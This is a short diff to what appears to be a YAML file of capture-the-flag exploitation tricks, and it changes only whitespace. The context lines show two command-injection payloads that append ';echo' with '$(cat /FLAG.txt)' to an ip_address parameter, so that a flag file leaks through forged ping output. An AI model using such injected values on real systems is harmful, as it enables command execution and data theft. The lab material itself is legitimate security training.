@@ -46,7 +46,6 @@ tricks:
     payload: |
       # Inject into "received" field
       ip_address=;echo "1 packets transmitted, $(cat /FLAG.txt) received, 0% packet loss"
-      
+
       # Inject into "packet loss" field
       ip_address=;echo "1 packets transmitted, 1 received, $(cat /FLAG.txt)% packet loss"
-
